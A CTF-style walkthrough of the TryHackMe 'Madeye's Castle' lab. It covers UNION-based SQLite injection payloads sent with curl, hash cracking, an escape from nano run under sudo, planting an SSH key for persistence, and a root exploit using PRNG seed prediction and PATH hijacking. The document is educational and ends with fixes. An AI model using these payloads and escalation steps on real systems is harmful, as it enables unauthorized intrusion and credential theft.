---
title: "Madeye's Castle — TryHackMe Walkthrough"
date: 2026-09-10
categories: [Writeups, TryHackMe]
tags: [sqli, sqlite, hash-cracking, gtfobins, path-hijacking, suid, privilege-escalation]
---

> **Authorized lab / spoiler warning:** This write-up documents my own work on the *Madeye's Castle* room on TryHackMe, an authorized, legal training environment. All flags are redacted as `[REDACTED]`. If you're working through this box yourself, I'd encourage you to try it before reading further — the SQL injection and privilege escalation chains are genuinely fun to work out on your own.

## Executive Summary

Madeye's Castle is a Harry-Potter-themed Linux box that chains together four distinct vulnerability classes into a full root compromise:

1. **SQL injection** in a custom Flask login form, exploited to dump an entire SQLite user database.
2. **Weak, crackable password hashing** — a SHA-512 hash cracked via John the Ripper using `rockyou.txt` + the `best64` rule set.
3. **Sudo misconfiguration** allowing a low-privileged user to run a text editor as a second user, abused via a GTFOBins-style shell escape.
4. **A custom SUID binary** with a predictable, time-seeded "random" number and an unqualified `system()` call, exploited via seed prediction and `PATH` hijacking to obtain a root shell.

The attack path: **unauthenticated web app → SQL injection → cracked credentials → SSH foothold (harry) → sudo/editor abuse → second user (hermonine) → SUID binary exploitation → root.**

## Reconnaissance

### Port scanning

An initial `nmap` scan of the target revealed only two open ports — a small attack surface, but enough to get started.

```bash
ping -c 3 10.129.186.186
nmap -sCV -p22,80 10.129.186.186
```

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80   | HTTP    | Apache httpd 2.4.41 (Ubuntu) |

![nmap scan results](/assets/img/posts/madeyes-castle/nmap.png)

The web server on port 80 initially returned the stock Apache "It works" default page — a strong signal that the real content was hosted on a **virtual host** rather than the bare IP.

### Virtual host discovery

Inspecting the page source of the default Apache page revealed an HTML comment left behind by the box author:

```html
<!-- TODO: Virtual hosting is good. TODO: Register for hogwartz-castle.thm -->
```

![Default Apache page with the vhost hint in the page source](/assets/img/posts/madeyes-castle/ApachePage.png)

This told us the real application lived under the hostname `hogwartz-castle.thm`, which Apache would only serve if the `Host:` header in the request matched. Since this hostname isn't real DNS, it had to be mapped manually:

```bash
sudo sh -c 'echo "10.129.186.186 hogwartz-castle.thm" >> /etc/hosts'
```

Browsing to `http://hogwartz-castle.thm/` revealed a simple login page ("Welcome to Hogwartz") with a username/password form posting to `/login`.

### Directory enumeration

```bash
gobuster dir -u http://hogwartz-castle.thm -w /usr/share/wordlists/dirb/common.txt
```

| Path | Status | Notes |
|------|--------|-------|
| `/javascript/` | 301 | Static asset folder |
| `/login` | 405 | POST-only endpoint, matches the login form |
| `/logout` | 302 | Confirms a session/cookie mechanism exists |
| `/server-status` | 403 | Apache `mod_status`, forbidden |
| `/static/` | 301 | Static asset folder |

The `/login` endpoint, rejecting a GET request with 405 Method Not Allowed, matched the form's `method="post"` and became the primary target.

## Technical Findings / Exploitation

### Establishing a baseline

Before attempting injection, a baseline request with garbage credentials confirmed the "normal" failure behavior of the app:

```bash
curl -s -X POST http://hogwartz-castle.thm/login -d "user=test&password=test" -i
```

Result: HTTP 200, body containing `Incorrect Username or Password`, Content-Length 623. This became the control response to compare all subsequent injection attempts against.

### Confirming SQL injection

A single unescaped quote in the `user` field broke the query:

```bash
curl -s -X POST http://hogwartz-castle.thm/login -d "user=admin'&password=test" -i
```

Result: **HTTP 500 Internal Server Error** — proof the input was reaching the SQL query unsanitized.

Commenting out the rest of the query with `-- ` restored valid syntax:

```bash
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=admin'-- -" --data-urlencode "password=anything" -i
```

This returned to the normal "incorrect" response (no literal `admin` user exists), confirming the comment syntax worked. Forcing a tautology to match every row in the table produced a completely different, revealing response:

```bash
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=admin' OR '1'='1'-- -" --data-urlencode "password=anything" -i
```

```json
{"error":"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}
```

The application explicitly confirmed the injection and leaked a real username from the database — a deliberate hint from the box author, but also a textbook demonstration of how verbose error messages can leak information.

### Determining column count

Since the injection point was confirmed, the next step for UNION-based extraction was to determine the number of columns in the underlying query, using the classic `ORDER BY` technique (combined with the tautology to guarantee rows were actually returned):

```bash
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=admin' OR '1'='1' ORDER BY 5-- -" --data-urlencode "password=anything" -i
```

`ORDER BY 1` through `4` returned successfully (with different users appearing as sort order changed); `ORDER BY 5` triggered a 500 error — confirming **the query returns exactly 4 columns**.

### Identifying the database engine

An initial attempt to fingerprint the database using the MySQL-style `version()` function failed with a 500 error. Testing SQLite's equivalent function succeeded:

```bash
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=admin' UNION SELECT sqlite_version(),'col2','col3','col4'-- -" \
  --data-urlencode "password=anything" -i
```

Result: `3.31.1` — confirming the backend database was **SQLite**, which meant schema enumeration would need to go through `sqlite_master` rather than the MySQL-style `information_schema`.

### Schema enumeration

```bash
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=admin' UNION SELECT sql,'col2','col3','col4' FROM sqlite_master WHERE type='table' AND name='users'-- -" \
  --data-urlencode "password=anything" -i
```

This returned the full `CREATE TABLE` statement:

```sql
CREATE TABLE users(
    name text not null,
    password text not null,
    admin int not null,
    notes text not null
)
```

![SQL injection dumping usernames from the database](/assets/img/posts/madeyes-castle/sqlinjectionusers.png)

### Data extraction

Using `group_concat()` to pull every row of a column into a single string (working around a 400 Bad Request triggered by combining fields with `||` string concatenation — likely a basic input filter), the full `name`, `password`, and `admin` columns were extracted for all 40 users:

```bash
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=admin' UNION SELECT group_concat(password),'col2','col3','col4' FROM users-- -" \
  --data-urlencode "password=anything" -i
```

![SQL injection dumping password hashes](/assets/img/posts/madeyes-castle/sqlinjectionhashes.png)

All 40 `admin` flags returned `0` — no administrative account existed in this table, ruling it out as a direct path to elevated web-app access. However, dumping the `notes` column surfaced a critical pivot point hidden among filler text:

> *"My linux username is my first name, and password uses best64"* — attributed to **Harry Turner**.

This was the bridge from "database access" to "system access": a hint that a real Linux account existed (`harry`) with a crackable password.

### Cracking the password hash

Harry's password hash was isolated directly:

```bash
curl -s -X POST http://hogwartz-castle.thm/login \
  --data-urlencode "user=admin' UNION SELECT password,'col2','col3','col4' FROM users WHERE name='Harry Turner'-- -" \
  --data-urlencode "password=anything" -i
```

```
b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885
```

The 128-character hex hash indicated a 512-bit digest. `hashcat --identify` returned several candidate algorithms (SHA2-512, SHA3-512, Whirlpool, Keccak-512, among others). Dictionary attacks against `rockyou.txt` with the `best64.rule` ruleset using **hashcat** failed against SHA2-512, SHA3-512, and Whirlpool modes — all three runs exhausted the full keyspace with zero matches.

Switching to **John the Ripper** with the equivalent `Raw-SHA512` format and its own `best64` rule succeeded:

```bash
john --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 harry_john.txt
```

```
wingardiumleviosa123 (harry)
```

![John the Ripper cracking Harry's password hash](/assets/img/posts/madeyes-castle/johnpasswordcracked.png)

**Lesson learned:** identically-named rule sets (`best64`) can differ in exact implementation between tools (hashcat vs. John), even when derived from the same source. When one tool's dictionary+rules attack fails, it's worth trying the same logical approach in a different tool before concluding the technique itself is wrong.

### Initial foothold via SSH

With a username (`harry`, per the note's convention of "Linux username is my first name") and cracked password (`wingardiumleviosa123`), SSH access was straightforward:

```bash
ssh harry@hogwartz-castle.thm
```

![SSH login as harry](/assets/img/posts/madeyes-castle/sshasharry.png)

```bash
cat user1.txt
```

**User 1 flag:** `[REDACTED]`

![user1.txt flag captured](/assets/img/posts/madeyes-castle/user1flag.png)


## Privilege Escalation — harry to hermonine

### Enumerating other accounts

```bash
cat /etc/passwd | grep -E "sh$"
```

This revealed four interactive-shell accounts: `root`, `harry`, `hermonine`, and `ubuntu`. `hermonine` (a stylized "Hermione") was the clear next target given the theme.

### Sudo misconfiguration

```bash
sudo -l
```

```
User harry may run the following commands on ip-10-129-185-89:
    (hermonine) /usr/bin/pico
```

![sudo -l output showing harry can run pico as hermonine](/assets/img/posts/madeyes-castle/passwdandsudopriv.png)

Harry was permitted to run `pico` as `hermonine` via `sudo`, without needing hermonine's password. On this system, `pico` was symlinked to **GNU nano 4.8**, not the original Pico editor, which changed the exploitation technique slightly.

### Exploiting the editor for command execution

Nano's help screen (`Ctrl+G`) did not list a direct "execute command" shortcut, but nano does support this as a sub-mode of its "Insert File" prompt: pressing `Ctrl+R` (Insert File) followed immediately by `Ctrl+X` switches the prompt into **Execute Command** mode, running the typed command and inserting its output into the buffer.

```bash
sudo -u hermonine /usr/bin/pico
# then inside nano: Ctrl+R, Ctrl+X, type: whoami
```

This confirmed command execution as `hermonine`. An attempt to spawn an interactive `bash` shell this way hung — nano's execute-command feature captures output rather than attaching a proper interactive TTY, so a plain `bash` call had no usable stdin/stdout and appeared to freeze.

![Using nano's execute-command feature as hermonine](/assets/img/posts/madeyes-castle/picocommandshermonine.png)

**Workaround — SSH key persistence.** Rather than fight the non-interactive execution model, an SSH key pair was generated locally and the public key appended to hermonine's `authorized_keys` via the same execute-command trick:

```bash
mkdir -p /home/hermonine/.ssh && \
echo "ssh-ed25519 AAAA...nour@kali" >> /home/hermonine/.ssh/authorized_keys && \
chmod 700 /home/hermonine/.ssh && \
chmod 600 /home/hermonine/.ssh/authorized_keys
```

```bash
ssh -i hermonine_key hermonine@hogwartz-castle.thm
```

![Generating a local SSH key pair used later for persistent access as hermonine](/assets/img/posts/madeyes-castle/generatesshforhermonine.png)

![SSH login as hermonine using the injected key](/assets/img/posts/madeyes-castle/sshashermonine.png)

```bash
cat user2.txt
```

**User 2 flag:** `[REDACTED]`

## Privilege Escalation — hermonine to root

### Enumeration

Standard post-foothold enumeration was performed:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
find / -perm -4000 -type f 2>/dev/null
```

Cron jobs were all standard Ubuntu housekeeping tasks — no custom entries. The SUID binary search, however, turned up one clearly non-standard entry among the expected system binaries (`sudo`, `passwd`, `mount`, etc.):

```
/srv/time-turner/swagger
```

```bash
ls -la /srv/time-turner/
file /srv/time-turner/swagger
```

```
-rwsr-xr-x 1 root root 8816 Nov 26 2020 swagger
swagger: setuid ELF 64-bit LSB shared object, ... not stripped
```

Owned by root with the SUID bit set, and not stripped (debug symbols intact) — a strong candidate for privilege escalation.

### Analyzing the binary

Running the binary presented a number-guessing challenge:

```
Guess my number: 3
Nope, that is not what I was thinking
I was thinking of 574026170
```

`strings` on the binary revealed the relevant library calls: `srand`, `time`, `setreuid`, `setregid`, `system`, alongside the literal string `uname -p` and success messages ("Nice use of the time-turner!", "This system architecture is").

This indicated the "random" number was seeded with `srand(time(NULL))` — a predictable, non-cryptographic seed based on the current Unix timestamp — and that a correct guess led to a `system()` call involving `uname -p`.

### Predicting the seed

Since `time(NULL)` has one-second resolution and is not secret, the exact "random" number could be reproduced by seeding an identical C program with the current time and calling `rand()` the same way:

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    srand(time(NULL));
    printf("%d\n", rand());
    return 0;
}
```

```bash
gcc /tmp/predict.c -o /tmp/predict
/tmp/predict; /srv/time-turner/swagger
```

Running the predictor and the real binary back-to-back (to minimize the risk of the clock ticking over to a new second between them) produced a matching number on the first attempt:

```
309654708
Guess my number: 309654708
Nice use of the time-turner!
This system architecture is x86_64
```

### PATH hijacking to root

With the guessing game beaten, the binary's `system("uname -p")` call (inferred from the strings output and observed behavior) became the target. Because the call used a bare command name rather than a full path, it was vulnerable to `PATH` hijacking: the shell spawned by `system()` resolves `uname` by searching directories listed in `PATH`, in order.

A malicious replacement was placed ahead of the real binary in `PATH`:

```bash
mkdir -p /tmp/evil
cat << 'EOF' > /tmp/evil/uname
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/evil/uname
export PATH=/tmp/evil:$PATH
```

The `-p` flag on the spawned bash was essential — it prevents bash from automatically dropping the elevated privileges it inherits from a SUID parent process (a safety default it applies when real and effective UID differ).

Re-running the seed-prediction attack against the SUID binary with the hijacked `PATH` in place:

```bash
/tmp/predict; /srv/time-turner/swagger
```

```
1109915322
Guess my number: 1109915322
Nice use of the time-turner!
This system architecture is root@ip-10-129-185-89:~#
```

The prompt changed to a root shell, confirmed with:

```bash
whoami   # root
id       # uid=0(root) gid=0(root) groups=0(root),1002(hermonine)
cat /root/root.txt
```

**Root flag:** `[REDACTED]`

## Attack Chain Summary

| Stage | Technique | Result |
|-------|-----------|--------|
| Recon | nmap, HTML comment, vhost mapping | Found real application at `hogwartz-castle.thm` |
| Web | SQL injection (UNION-based, SQLite) | Dumped 40 user records, including a credential hint |
| Credential access | Hash cracking (John, `best64` rule) | Recovered `harry`'s plaintext password |
| Foothold | SSH | Shell as `harry`, user1 flag |
| Lateral movement | Sudo misconfiguration + nano execute-command | Shell as `hermonine`, user2 flag |
| Privilege escalation | Predictable PRNG seed + SUID binary + PATH hijack | Root shell, root flag |

## Lessons Learned

- **Verbose error messages are a gift to attackers.** The application's own error responses confirmed the injection was working and even named affected users — invaluable for us, but a serious information disclosure issue in a real deployment.
- **Tool parity isn't guaranteed.** Hashcat and John both claim to support a "best64" rule set, but they didn't behave identically here. When a cracking attempt exhausts its keyspace with no result, switching tools is a cheap next step before assuming the target is out of reach.
- **`sudo` rules granting access to general-purpose interactive programs (editors, pagers, etc.) are a well-known escalation risk.** Any interactive tool with a "shell out" or "execute command" capability effectively grants a shell as the target user — this is exactly what GTFOBins catalogs.
- **`time()` is not a source of secure randomness.** Seeding a PRNG with the current Unix timestamp makes its output trivially predictable to anyone who can run code on the same machine at roughly the same time.
- **Unqualified calls to `system()` in SUID binaries are dangerous.** Always invoke external commands with fully-qualified paths (`/usr/bin/uname`, not `uname`) inside privileged code, and prefer `execve()`-family calls with explicit arguments over shelling out entirely.

## Recommendations

1. Parameterize all SQL queries (prepared statements) instead of building queries via string concatenation.
2. Return generic, non-descriptive error messages to end users; log detailed errors server-side only.
3. Hash passwords with a slow, purpose-built algorithm (bcrypt, scrypt, or Argon2) rather than a single fast round of SHA-512.
4. Avoid granting `sudo` access to interactive editors, pagers, or other multi-purpose binaries; if unavoidable, use `rbash` or explicit command restrictions.
5. Remove unnecessary SUID bits from custom binaries; where SUID is required, avoid `system()`/shell-outs entirely and use fully-qualified paths for any external command execution.
6. Do not seed random number generators with predictable values (timestamps) for anything security-relevant.

## Appendix — Command Log

```bash
# Recon
nmap -sCV -p22,80 10.129.186.186
sudo sh -c 'echo "10.129.186.186 hogwartz-castle.thm" >> /etc/hosts'
gobuster dir -u http://hogwartz-castle.thm -w /usr/share/wordlists/dirb/common.txt

# SQL injection
curl -s -X POST http://hogwartz-castle.thm/login --data-urlencode "user=admin' OR '1'='1'-- -" --data-urlencode "password=anything" -i
curl -s -X POST http://hogwartz-castle.thm/login --data-urlencode "user=admin' UNION SELECT sqlite_version(),'col2','col3','col4'-- -" --data-urlencode "password=anything" -i
curl -s -X POST http://hogwartz-castle.thm/login --data-urlencode "user=admin' UNION SELECT sql,'col2','col3','col4' FROM sqlite_master WHERE type='table' AND name='users'-- -" --data-urlencode "password=anything" -i
curl -s -X POST http://hogwartz-castle.thm/login --data-urlencode "user=admin' UNION SELECT group_concat(password),'col2','col3','col4' FROM users-- -" --data-urlencode "password=anything" -i

# Cracking
john --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 harry_john.txt

# Foothold
ssh harry@hogwartz-castle.thm

# hermonine pivot
sudo -l
sudo -u hermonine /usr/bin/pico   # Ctrl+R, Ctrl+X, then a command
ssh -i hermonine_key hermonine@hogwartz-castle.thm

# Root
find / -perm -4000 -type f 2>/dev/null
strings /srv/time-turner/swagger
gcc /tmp/predict.c -o /tmp/predict
export PATH=/tmp/evil:$PATH
/tmp/predict; /srv/time-turner/swagger
```

---

*Machine: Madeye's Castle (TryHackMe). All flags redacted per lab policy.*
